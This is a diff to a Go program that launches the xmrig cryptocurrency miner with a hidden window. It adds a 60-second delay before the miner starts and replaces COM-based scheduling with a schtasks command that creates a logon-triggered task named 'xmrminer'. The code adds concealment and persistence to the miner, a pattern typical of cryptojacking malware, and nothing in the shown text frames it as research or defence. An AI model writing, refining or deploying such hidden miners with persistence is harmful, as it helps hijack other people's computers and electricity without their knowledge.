@@ -12,8 +12,7 @@ import (
 	"path/filepath"
 	"strings"
 	"syscall"
-	"github.com/go-ole/go-ole"
-	"github.com/go-ole/go-ole/oleutil"
+	"time"
 //	"os/user"
 // 	"os/signal"
 )
@@ -115,6 +114,8 @@ func startCommand(dir string) {
 	cmd := exec.Command(filepath.Join(dir, "xmrcache", "xmrig.exe"), "-c", filepath.Join(dir, "xmrcache", "config.json"))
 	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 
+	time.Sleep(60*time.Second)
+
 	if err := cmd.Start(); err != nil {
 		log.Printf("Failed to start cmd: %v", err)
 		return
@@ -168,89 +169,24 @@ func copy(src, dst string) error {
 }
 
 func autostart() {
-	// Get the path to the executable
-	exePath, err := filepath.Abs(os.Args[0])
+	// Get the path of the current executable
+	exePath, err := os.Executable()
 	if err != nil {
-		log.Println("Error getting executable path:", err)
+		log.Println("Failed to get the executable path:", err)
 		return
 	}
 
-	ole.CoInitialize(0)
-	defer ole.CoUninitialize()
+	// Create a command to execute the Windows Task Scheduler
+	cmd := exec.Command("schtasks", "/create", "/tn", "xmrminer", "/tr", exePath, "/sc", "ONLOGON")
 
-	unknown, err := oleutil.CreateObject("Schedule.Service")
+	// Run the command
+	err = cmd.Run()
 	if err != nil {
-		log.Println(err)
+		log.Println("Failed to create the task:", err)
+		return
 	}
 
-	defer unknown.Release()
-
-	scheduler, err := unknown.QueryInterface(ole.IID_IDispatch)
-	if err != nil {
-		log.Println(err)
-	}
-
-	defer scheduler.Release()
-
-	taskDefinition, err := oleutil.CallMethod(scheduler, "NewTask", 0, "")
-	if err != nil {
-		log.Println(err)
-	}
-
-	defer taskDefinition.Clear()
-
-	taskDefinitionDisp := taskDefinition.ToIDispatch()
-
-	defer taskDefinitionDisp.Release()
-	_, err = oleutil.PutProperty(taskDefinitionDisp, "RegistrationInfo.Author", "Mikołaj Lubiak")
-	if err != nil {
-		log.Println(err)
-	}
-
-	_, err = oleutil.PutProperty(taskDefinitionDisp, "RegistrationInfo.Description", "Start the program at user login")
-	if err != nil {
-		log.Println(err)
-	}
-
-	// Set the trigger to start at login
-	triggersDisp := oleutil.MustCallMethod(taskDefinitionDisp, "Triggers").ToIDispatch()
-
-	defer triggersDisp.Release()
-
-	triggerDisp := oleutil.MustCallMethod(triggersDisp, "Create", 9).ToIDispatch()
-
-	defer triggerDisp.Release()
-
-	_, err = oleutil.PutProperty(triggerDisp, "StartBoundary", "2010-01-01T00:00:00")
-	if err != nil {
-		log.Println(err)
-	}
-
-	_, err = oleutil.PutProperty(triggerDisp, "Enabled", true)
-	if err != nil {
-		log.Println(err)
-	}
-
-	actionsDisp := oleutil.MustCallMethod(taskDefinitionDisp, "Actions").ToIDispatch()
-
-	defer actionsDisp.Release()
-
-	actionDisp := oleutil.MustCallMethod(actionsDisp, "Create", 0).ToIDispatch()
-
-	defer actionDisp.Release()
-
-	_, err = oleutil.PutProperty(actionDisp, "Path", exePath)
-	if err != nil {
-		log.Println(err)
-	}
-	rootFolderDisp := oleutil.MustCallMethod(scheduler, "GetFolder", "\\").ToIDispatch()
-
-	defer rootFolderDisp.Release()
-
-	_, err = oleutil.CallMethod(rootFolderDisp, "RegisterTaskDefinition", "xmrminer", taskDefinitionDisp, 6, "", "", 2, nil)
-	if err != nil {
-		log.Println(err)
-	}
+	log.Println("Task created successfully.")
 }
 
 
